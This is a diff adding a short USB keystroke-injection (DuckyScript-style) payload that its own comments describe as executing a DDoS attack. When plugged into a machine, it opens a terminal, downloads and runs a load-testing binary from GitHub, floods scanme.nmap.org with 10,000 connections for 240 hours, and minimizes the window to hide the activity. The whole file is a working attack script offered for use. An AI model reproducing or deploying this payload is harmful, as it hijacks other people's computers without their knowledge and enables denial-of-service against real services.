@@ -1,0 +1,21 @@
+REM Executes a DDOS attack to a predefined target
+REM Opens a terminal
+CTRL-ALT t
+DELAY 1000
+REM Downloads the script to execute
+STRING wget https://github.com/codesenberg/bombardier/releases/download/v2.0.2/bombardier-linux-amd64
+DELAY 800
+ENTER
+DELAY 800
+REM Makes the script executable
+STRING chmod +x bombardier-linux-amd64
+DELAY 800
+ENTER
+DELAY 800
+REM Executes the DDOS attack
+STRING ./bombardier-linux-amd64 --duration=240h --latencies --connections=10000 https://scanme.nmap.org
+DELAY 800
+ENTER
+DELAY 800
+REM Minimizes the terminal
+WINDOWS h
